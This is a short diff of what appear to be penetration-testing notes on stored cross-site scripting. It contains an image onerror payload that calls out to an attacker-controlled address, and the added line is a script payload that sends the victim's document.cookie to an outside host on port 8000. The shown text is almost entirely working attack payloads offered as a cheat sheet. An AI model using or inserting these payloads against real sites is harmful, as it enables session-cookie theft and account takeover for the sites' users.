@@ -268,7 +268,7 @@ Stored XSS
     Resides on vulnerable site
     Only requires user to visit page
     <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
-
+    <script>document.location="http://10.50.24.xxx:8000/"+document.cookie;</script>
 Useful Javascript components
 
     Proof of concept (simple alert)
